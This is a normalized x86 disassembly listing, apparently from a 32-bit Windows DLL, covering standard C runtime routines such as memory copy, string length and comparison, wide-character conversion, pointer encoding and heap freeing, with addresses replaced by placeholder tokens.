seto cl
neg ecx
or ecx eax
push ecx
call sub_10012766
mov ebx eax
mov eax edi
add esp 0x4
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov ecx edi
sub eax edx
lea edx [ ecx + 0x1 ]
mov [ ebp - 0x30 ] edx
mov dl [ ecx ]
inc ecx
test dl dl
jne r-xdata
sub ecx [ ebp - 0x30 ]
inc eax
push eax
push ebx
inc ecx
push ecx
push edi
xor edi edi
push edi
push edi
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
xor ecx ecx
mov eax ebx
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x2c ] cx
lea edx [ eax + 0x2 ]
jmp r-xdata
push ebx
call sub_10012e64
xor eax eax
add esp 0x4
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] edi
mov [ esi ] ax
push edi
mov eax r--data
mov ecx esi
call sub_10010fb0
jmp r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx di
jne r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10012771
mov esp ebp
pop ebp
retn
sub eax edx
sar eax 0x1
push eax
mov eax ebx
lea ecx [ ebp - 0x2c ]
call sub_10010fb0
push ebx
mov [ ebp - 0x4 ] edi
call sub_10012e64
mov [ esi + 0x10 ] edi
xor edx edx
mov [ esi + 0x14 ] 0x7
add esp 0x4
lea edi [ ebp - 0x2c ]
mov [ esi ] dx
call sub_10012620
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_10012c4b
add esp 0x4
sub_10012620
cmp esi edi
je r-xdata
mov eax esi
retn
cmp [ esi + 0x14 ] 0x8
jb r-xdata
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
cmp [ edi + 0x14 ] 0x8
jae r-xdata
mov eax [ esi ]
push eax
call sub_10012c4b
add esp 0x4
mov ecx [ edi ]
mov [ esi ] ecx
mov [ edi ] 0x0
mov edx [ edi + 0x10 ]
lea eax [ edx + edx + 0x2 ]
push eax
push edi
push esi
call sub_100128c0
add esp 0xc
jmp r-xdata
mov edx [ edi + 0x10 ]
mov [ esi + 0x10 ] edx
mov eax [ edi + 0x14 ]
mov [ esi + 0x14 ] eax
mov [ edi + 0x10 ] 0x0
mov [ edi + 0x14 ] 0x0
sub_100126ab
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
call sub_10012808
push r--data
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] r--data
call sub_10013848
int3
sub_100126f8
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
call sub_10012808
push r--data
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] r--data
call sub_10013848
int3
sub_10012745
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10012864
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10012c4b
pop ecx
sub_100127aa
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push edi
mov edi ecx
je r-xdata
pop edi
pop ebp
retn 0x4
push esi
push [ ebp + 0x8 ]
call sub_10013a00
lea esi [ eax + 0x1 ]
push esi
call sub_10013537
pop ecx
pop ecx
mov [ edi + 0x4 ] eax
test eax eax
je r-xdata
pop esi
push [ ebp + 0x8 ]
push esi
push eax
call sub_1001399a
add esp 0xc
mov [ edi + 0x8 ] 0x1
sub_10012808
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x8 ] 0x0
push [ eax ]
call sub_100127aa
mov eax esi
pop esi
pop ebp
retn 0x4
sub_1001282f
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi ecx
cmp edi esi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
call sub_100127ea
cmp [ esi + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
mov [ edi + 0x4 ] eax
push [ esi + 0x4 ]
mov ecx edi
call sub_100127aa
jmp r-xdata
sub_1001286f
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_100127ea
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10012c4b
pop ecx
sub_10012896
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x8 ] 0x0
call sub_1001282f
mov eax esi
pop esi
pop ebp
retn 0x4
sub_100128c0
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x80
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_10012944 ]
jmp [ ecx * 4 + jump_table_100129c4 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10012a30 ]
jmp r-xdata
jmp [ ecx * 4 + jump_table_10012bcc ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_10012ad0 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_10012bcc ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_10012a30 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
push edi
mov eax esi
and eax 0xf
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_10012bcc ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10012a30 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10012a30 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10012a30 ]
mov edx 0x10
sub edx eax
sub ecx edx
push ecx
mov eax edx
mov ecx eax
and ecx 0x3
je r-xdata
mov edx ecx
and ecx 0x7f
shr edx 0x7
je r-xdata
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_10012bcc ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_10012bcc ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_10012bcc ]
shr eax 0x2
je r-xdata
mov dl [ esi ]
mov [ edi ] dl
inc esi
inc edi
dec ecx
jne r-xdata
test ecx ecx
je r-xdata
jmp r-xdata
pop ecx
jmp r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec eax
jne r-xdata
pop eax
pop esi
pop edi
pop ebp
retn
mov edx ecx
shr edx 0x4
test edx edx
je r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec edx
jne r-xdata
and ecx 0xf
je r-xdata
lea ebx [ ebx ]
mov eax ecx
shr ecx 0x2
je r-xdata
movdqa xmm0 [ esi ]
movdqa [ edi ] xmm0
lea esi [ esi + 0x10 ]
lea edi [ edi + 0x10 ]
dec edx
jne r-xdata
mov ecx eax
and ecx 0x3
je r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec ecx
jne r-xdata
mov al [ esi ]
mov [ edi ] al
inc esi
inc edi
dec ecx
jne r-xdata
sub_10012c66
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10012c56
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10012c4b
pop ecx
sub_10012c87
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add ecx 0x9
push ecx
add eax 0x9
push eax
call sub_10013e80
neg eax
pop ecx
sbb eax eax
pop ecx
inc eax
pop ebp
retn 0x4
sub_10012ca7
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
jmp r-xdata
push [ ebp + 0x8 ]
call sub_10013537
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call sub_10013f17
pop ecx
test eax eax
je r-xdata
leave
retn
test [ rw-data ] 0x1
mov edi rw-data
mov esi r--data
jne r-xdata
push edi
lea ecx [ ebp - 0x10 ]
call sub_10012896
push r--data
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] esi
call sub_10013848
int3
or [ rw-data ] 0x1
push 0x1
lea eax [ ebp - 0x4 ]
push eax
mov ecx edi
mov [ ebp - 0x4 ] r--data
call sub_10012780
push sub_1001d934
mov [ rw-data ] esi
call sub_10012f92
pop ecx
sub_10012d27
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
push 0x0
add eax 0x2ac18000
push 0x989680
adc ecx 0xfe624e21
push ecx
push eax
call sub_10013f40
cmp edx 0x7
jl r-xdata
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
jg r-xdata
leave
retn
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
or eax 0xffffffff
mov edx eax
cmp eax 0x93406fff
jbe r-xdata
sub_10012d80
mov eax [ esp + 0xc ]
push ebx
test eax eax
je r-xdata
pop ebx
retn
mov edx [ esp + 0x8 ]
xor ebx ebx
mov bl [ esp + 0xc ]
test edx 0x3
je r-xdata
sub eax 0x4
jb r-xdata
mov cl [ edx ]
add edx 0x1
xor cl bl
je r-xdata
add eax 0x4
je r-xdata
push edi
mov edi ebx
shl ebx 0x8
add ebx edi
mov edi ebx
shl ebx 0x10
add ebx edi
jmp r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
sub eax 0x1
je r-xdata
mov cl [ edx ]
add edx 0x1
xor cl bl
je r-xdata
mov ecx [ edx ]
xor ecx ebx
mov edi 0x7efefeff
add edi ecx
xor ecx 0xffffffff
xor ecx edi
add edx 0x4
and ecx 0x81010100
je r-xdata
test edx 0x3
jne r-xdata
sub eax 0x1
jne r-xdata
sub eax 0x4
jb r-xdata
mov ecx [ edx - 0x4 ]
xor cl bl
je r-xdata
pop edi
lea eax [ edx - 0x4 ]
pop edi
pop ebx
retn
xor ch bl
je r-xdata
lea eax [ edx - 0x3 ]
pop edi
pop ebx
retn
shr ecx 0x10
xor cl bl
je r-xdata
lea eax [ edx - 0x2 ]
pop edi
pop ebx
retn
xor ch bl
je r-xdata
pop edi
jmp r-xdata
sub_10012e6f
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ DecodePointer@IAT ]
push edi
push [ rw-data ]
call esi
push [ rw-data ]
mov ebx eax
mov [ ebp - 0x4 ] ebx
call esi
mov esi eax
cmp esi ebx
jb r-xdata
xor eax eax
mov edi esi
sub edi ebx
lea eax [ edi + 0x4 ]
cmp eax 0x4
jb r-xdata
push ebx
call sub_100145a5
mov ebx eax
lea eax [ edi + 0x4 ]
pop ecx
cmp ebx eax
jae r-xdata
push [ ebp + 0x8 ]
mov edi [ EncodePointer@IAT ]
call edi
mov [ esi ] eax
add esi 0x4
push esi
call edi
mov [ rw-data ] eax
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov eax 0x800
cmp ebx eax
jae r-xdata
pop edi
pop esi
pop ebx
leave
retn
add eax ebx
cmp eax ebx
jb r-xdata
mov eax ebx
lea eax [ ebx + 0x10 ]
cmp eax ebx
jb r-xdata
push eax
push [ ebp - 0x4 ]
call sub_10014557
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
push [ ebp - 0x4 ]
call sub_10014557
pop ecx
pop ecx
test eax eax
je r-xdata
sar edi 0x2
push eax
lea esi [ eax + edi * 4 ]
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
sub_10012f25
mov edi edi
push esi
push 0x4
push 0x20
call sub_1001450b
pop ecx
pop ecx
mov esi eax
push esi
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
mov [ rw-data ] eax
test esi esi
jne r-xdata
and [ esi ] 0x0
xor eax eax
pop esi
retn
push 0x18
pop eax
pop esi
retn
sub_10012f56
push 0xc
push r--data
call sub_100148a0
call sub_1001461b
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_10012e6f
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10012f8c
mov eax [ ebp - 0x1c ]
call sub_100148e5
retn
sub_10012fa9
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0xc ]
cmp [ ebx ] 0x0
push edi
mov edi eax
je r-xdata
pop edi
pop ebx
pop ebp
retn
movzx ecx [ eax ]
test cx cx
je r-xdata
xor eax eax
mov edx ecx
sub eax ebx
cmp [ ecx ] 0x0
je r-xdata
movzx edx [ ecx ]
test dx dx
je r-xdata
mov eax edi
jmp r-xdata
add edi 0x2
movzx edx [ edi ]
add eax 0x2
test dx dx
jne r-xdata
movzx ebx [ eax + ecx ]
sub ebx edx
jne r-xdata
mov ecx [ ebp + 0xc ]
test dx dx
je r-xdata
add ecx 0x2
cmp [ eax + ecx ] bx
jne r-xdata
sub_10013009
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi + 0xc ] 0x0
test eax eax
jne r-xdata
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
call sub_1001565c
mov [ esi + 0x8 ] eax
mov ecx [ eax + 0x6c ]
mov [ esi ] ecx
mov ecx [ eax + 0x68 ]
mov [ esi + 0x4 ] ecx
mov ecx [ esi ]
cmp ecx [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
call sub_10015433
mov [ esi ] eax
mov eax esi
pop esi
pop ebp
retn 0x4
or [ eax + 0x70 ] 0x2
mov [ esi + 0xc ] 0x1
jmp r-xdata
call sub_10014cb2
mov [ esi + 0x4 ] eax
sub_10013090
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
movzx ecx [ edx ]
lea edi [ ecx - 0x41 ]
inc edx
cmp edi 0x19
ja r-xdata
add eax 0x20
test eax eax
je r-xdata
add ecx 0x20
pop edi
sub eax ecx
pop esi
pop ebp
retn
cmp eax ecx
je r-xdata
movzx eax [ esi ]
lea ecx [ eax - 0x41 ]
inc esi
cmp ecx 0x19
ja r-xdata
sub_100130c9
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x10 ]
call sub_10013009
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
call sub_10015c7f
mov [ eax ] 0x16
call sub_10015c2d
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] 0x0
jne r-xdata
call sub_10015c7f
mov [ eax ] 0x16
call sub_10015c2d
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub ebx esi
push edi
push esi
push ebx
call sub_10013090
pop ecx
pop ecx
jmp r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
sub edi eax
mov eax edi
pop edi
cmp edi eax
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop esi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
movzx eax [ ebx + esi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_1001598e
mov edi eax
movzx eax [ esi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_1001598e
add esp 0x10
inc esi
test edi edi
je r-xdata
sub_10013189
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ rw-data ] eax
jne r-xdata
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100130c9
add esp 0xc
pop ebp
retn
cmp [ ebp + 0x8 ] eax
jne r-xdata
cmp [ ebp + 0xc ] eax
je r-xdata
call sub_10015c7f
mov [ eax ] 0x16
call sub_10015c2d
mov eax 0x7fffffff
pop ebp
retn
pop ebp
jmp sub_10013090
sub_100131d0
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
mov ebx [ ebp + 0x10 ]
test ebx ebx
jne r-xdata
push esi
cmp ebx 0x4
jb r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
lea esi [ ebx - 0x4 ]
test esi esi
je r-xdata
pop ebx
leave
retn
cmp esi ebx
jb r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov dl [ eax ]
test dl dl
je r-xdata
xor eax eax
movzx eax [ eax - 0x4 ]
movzx ecx [ ecx - 0x4 ]
jmp r-xdata
cmp dl [ ecx - 0x4 ]
jne r-xdata
movzx eax [ eax ]
movzx ecx [ ecx ]
cmp dl [ ecx ]
jne r-xdata
sub eax ecx
jmp r-xdata
mov dl [ eax - 0x3 ]
test dl dl
je r-xdata
pop esi
inc eax
inc esi
inc ecx
movzx eax [ eax - 0x3 ]
movzx ecx [ ecx - 0x3 ]
jmp r-xdata
cmp dl [ ecx - 0x3 ]
jne r-xdata
mov dl [ eax - 0x2 ]
test dl dl
je r-xdata
movzx eax [ eax - 0x2 ]
movzx ecx [ ecx - 0x2 ]
jmp r-xdata
cmp dl [ ecx - 0x2 ]
jne r-xdata
mov dl [ eax - 0x1 ]
test dl dl
je r-xdata
movzx eax [ eax - 0x1 ]
movzx ecx [ ecx - 0x1 ]
jmp r-xdata
cmp dl [ ecx - 0x1 ]
jne r-xdata
add [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x4 ] esi
jb r-xdata
mov dl [ eax ]
add eax 0x4
add ecx 0x4
test dl dl
je r-xdata
jmp r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
sub_10013290
mov ecx [ esp + 0x8 ]
push edi
push ebx
push esi
mov dl [ ecx ]
mov edi [ esp + 0x10 ]
test dl dl
je r-xdata
mov eax edi
pop esi
pop ebx
pop edi
retn
mov dh [ ecx + 0x1 ]
test dh dh
je r-xdata
xor eax eax
pop esi
pop ebx
pop edi
mov al dl
jmp sub_10015ce6
mov esi edi
mov ecx [ esp + 0x14 ]
mov al [ edi ]
add esi 0x1
cmp al dl
je r-xdata
mov al [ esi ]
add esi 0x1
cmp al dh
jne r-xdata
test al al
je r-xdata
cmp al dl
je r-xdata
lea edi [ esi - 0x1 ]
pop esi
pop ebx
pop edi
xor eax eax
retn
mov al [ esi ]
add esi 0x1
test al al
jne r-xdata
lea eax [ edi - 0x1 ]
pop esi
pop ebx
pop edi
retn
mov al [ esi ]
add esi 0x2
cmp al ah
jne r-xdata
mov al [ ecx + 0x3 ]
test al al
je r-xdata
mov ah [ esi - 0x1 ]
add ecx 0x2
cmp al ah
je r-xdata
mov ah [ ecx + 0x2 ]
test ah ah
je r-xdata
jmp r-xdata
sub_10013316
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
push edi
xor ebx ebx
push 0x7
xor eax eax
pop ecx
lea edi [ ebp - 0x1c ]
mov [ ebp - 0x20 ] ebx
[ edi ]
cmp [ ebp + 0xc ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
call sub_10015c7f
mov [ eax ] 0x16
call sub_10015c2d
or eax 0xffffffff
jmp r-xdata
push esi
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x20 ] eax
lea eax [ ebp + 0x10 ]
push eax
push ebx
push [ ebp + 0xc ]
lea eax [ ebp - 0x20 ]
push eax
mov [ ebp - 0x1c ] 0x7fffffff
mov [ ebp - 0x14 ] 0x42
call sub_10015fa9
add esp 0x10
dec [ ebp - 0x1c ]
mov esi eax
js r-xdata
pop edi
pop ebx
leave
retn
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_10015d9e
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
jmp r-xdata
mov eax esi
pop esi
sub_1001339a
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
cmp [ ebp + 0x10 ] 0x0
push ebx
push esi
push edi
je r-xdata
xor eax eax
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_10013009
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
call sub_10015c7f
mov [ eax ] 0x16
call sub_10015c2d
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edi 0x7fffffff
cmp [ ebp + 0x10 ] edi
jbe r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] 0x0
jne r-xdata
call sub_10015c7f
mov [ eax ] 0x16
call sub_10015c2d
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub ebx esi
push [ ebp + 0x10 ]
push esi
push ebx
call sub_10016b60
add esp 0xc
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub edi eax
mov eax edi
jmp r-xdata
test edi edi
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp edi eax
je r-xdata
movzx eax [ ebx + esi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_1001598e
mov edi eax
movzx eax [ esi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_1001598e
add esp 0x10
inc esi
dec [ ebp + 0x10 ]
je r-xdata
sub_1001347c
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ rw-data ] eax
jne r-xdata
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001339a
add esp 0x10
pop ebp
retn
cmp [ ebp + 0x8 ] eax
jne r-xdata
cmp [ ebp + 0xc ] eax
je r-xdata
call sub_10015c7f
mov [ eax ] 0x16
call sub_10015c2d
mov eax 0x7fffffff
pop ebp
retn
cmp [ ebp + 0x10 ] 0x7fffffff
ja r-xdata
pop ebp
jmp sub_10016b60
sub_100134cf
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx eax
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
mov cx [ ebp + 0xc ]
cmp [ eax ] cx
je r-xdata
cmp [ eax ] cx
jne r-xdata
pop ebp
retn
xor eax eax
sub eax 0x2
cmp eax edx
je r-xdata
sub_100134fd
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
push esi
call sub_10015c7f
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_10015c3d
pop ecx
mov [ esi ] eax
pop esi
sub_10013537
mov edi edi
push ebp
mov ebp esp
push ebx
